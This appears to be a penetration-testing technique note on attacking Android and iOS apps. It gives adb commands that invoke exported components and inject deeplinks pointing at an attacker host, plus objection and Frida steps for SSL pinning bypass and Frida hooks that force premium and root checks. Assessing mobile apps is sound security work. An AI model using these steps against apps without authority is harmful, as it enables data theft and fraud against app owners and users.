---
category: technique
title: "Mobile Application Attacks - Android and iOS"
tags: [mobile, android, ios, apk, ipa, frida, objection, ssl-pinning, deeplink, keychain, keystore, intent, exported-component, mobile-api]
---

# Mobile Application Attacks

The mobile app is a client you fully control. The real target is almost always the backend API plus what the app trusts about its own runtime. Most mobile bugs are: secrets baked into the binary, weak local storage, broken deeplink/IPC handling, and client-side controls the server forgot to re-check.

The single most important mindset: the app runs on the attacker's device. Any check it performs, any secret it holds, any pinning it does - the attacker can read, patch, or bypass it. The only real boundary is the server.

---

## Get the artifact and unpack it

Android (APK):
```bash
# Pull installed APK from a device
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk

# Decompile to smali + resources
apktool d base.apk -o app_src

# Decompile to readable Java
jadx -d app_out base.apk    # or: jadx-gui base.apk
```

iOS (IPA):
```bash
# IPA is a zip - decrypted binary needed (use frida-ios-dump on jailbroken device)
unzip target.ipa -d ipa_out
class-dump ipa_out/Payload/Target.app/Target   # Objective-C headers
otool -L Target                                  # linked frameworks
```

---

## Static analysis - what to grep first

```bash
# Hardcoded secrets, API keys, endpoints
grep -rniE "api[_-]?key|secret|password|token|bearer|aws_|firebase|http://|https://" app_out/

# Android: backend URLs and config
grep -rniE "BASE_URL|API_URL|http" app_out/resources/res/values/strings.xml

# Crypto misuse - hardcoded keys, ECB mode, static IV
grep -rniE "AES|DES|SecretKeySpec|IvParameterSpec|ECB|\"0000" app_out/
```

Run automated first-pass: `mobsf` (Mobile Security Framework) gives a full static report - secrets, permissions, exported components, insecure storage flags. `apkleaks` is a fast secret/endpoint extractor.

---

## Android attack surface

**Exported components.** Activities, services, broadcast receivers, and content providers marked `android:exported="true"` (or with an intent-filter) are callable by ANY other app on the device.

```bash
# Find exported components in the manifest
grep -A3 "android:exported=\"true\"" app_out/AndroidManifest.xml

# Invoke an exported activity directly (bypasses login screens)
adb shell am start -n com.target.app/.AdminActivity

# Send a broadcast to an exported receiver with attacker-controlled extras
adb shell am broadcast -a com.target.app.ACTION_X --es token "injected"

# Query an exported content provider for data it should not expose
adb shell content query --uri content://com.target.app.provider/users
```

**Deeplink / intent injection.** Custom URL schemes (`myapp://`) and App Links handle external input. If the app loads a deeplink-supplied URL into a WebView or uses it to route to internal screens, you get open redirect, WebView XSS, or auth-screen bypass.

```bash
adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.com" com.target.app
```

**Insecure storage.** Check what the app writes unencrypted:
```bash
adb shell run-as com.target.app ls -la /data/data/com.target.app/shared_prefs/
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml
# tokens, session cookies, PII in plaintext SharedPreferences = finding
```

**WebView issues.** `setJavaScriptEnabled(true)` + `addJavascriptInterface` exposes native methods to JS. If the WebView loads any attacker-influenced content, that bridge is RCE-adjacent. Grep: `addJavascriptInterface`, `setAllowFileAccess`, `loadUrl`.

---

## iOS attack surface

**Keychain and local storage.** Check Keychain accessibility class - items with `kSecAttrAccessibleAlways` survive lock and are weaker. Plist files in the app sandbox often hold tokens.

**URL scheme handling.** Same as Android deeplinks - `application:openURL:` and Universal Links. Look for routing decisions or WebView loads based on the incoming URL.

**Jailbreak detection is not a control.** It is an obstacle for you, not a security boundary. Bypass with objection or a Frida script - then continue.

---

## SSL pinning bypass (do this early)

Pinning blocks you from seeing the API traffic in Burp. Bypass it, then test the API like any web target - because that is where the real bugs are.

```bash
# objection - patches pinning at runtime, no manual scripting
objection -g com.target.app explore
# then in the objection shell:
android sslpinning disable
# iOS:
ios sslpinning disable

# Frida with a universal pinning bypass script
frida -U -f com.target.app -l frida-universal-pinning-bypass.js

# Or patch the APK statically: add a network_security_config.xml
# that trusts user CAs, then re-sign and reinstall
```

After bypass: route the device through Burp, exercise every feature, and now you have the full API surface. Apply all the web technique files (auth-logic-bugs, oauth-jwt-attacks, ssrf-techniques) to that API.

---

## Runtime instrumentation with Frida

Frida lets you hook any method at runtime - dump arguments, change return values, bypass client-side checks.

```javascript
// Bypass a client-side root/jailbreak or "isPremium" check by forcing return value
Java.perform(function() {
    var Checker = Java.use("com.target.app.SecurityChecker");
    Checker.isDeviceRooted.implementation = function() { return false; };
    Checker.isPremiumUser.implementation = function() { return true; };
});

// Dump arguments to a crypto or signing function to recover keys
Java.perform(function() {
    var Crypto = Java.use("com.target.app.CryptoHelper");
    Crypto.encrypt.overload('java.lang.String').implementation = function(s) {
        console.log("encrypt input: " + s);
        return this.encrypt(s);
    };
});
```

The key insight: any boolean check the app does locally (is premium, is allowed, is verified) can be flipped. If flipping it grants access to data or features, the server is trusting a client-side decision - that is the finding.

---

## The core question for every mobile finding

Does the server re-validate this, or does it trust the client?

- App hides the "admin" button -> call the API endpoint directly, does it check the role?
- App enforces purchase before unlocking -> does the server verify the receipt, or trust a client flag?
- App validates input format -> does the server validate it too, or assume the app already did?

The mobile binary is a map of the API and a list of the assumptions the developers made about their own client. Read it for both.

---

## Tools

```bash
# Static
mobsf            # full automated static analysis report
jadx / jadx-gui  # APK to Java
apktool          # APK to smali (for re-packaging)
class-dump       # iOS Obj-C headers
apkleaks         # fast secret/endpoint extraction

# Dynamic
frida / frida-ios-dump   # runtime hooking, decrypt iOS binaries
objection                # frida wrapper - pinning bypass, storage dump, no scripting
adb                      # Android device control

# Install
brew install apktool jadx frida    # macOS
uv venv .venv && uv pip install frida-tools objection mobsf apkleaks
```
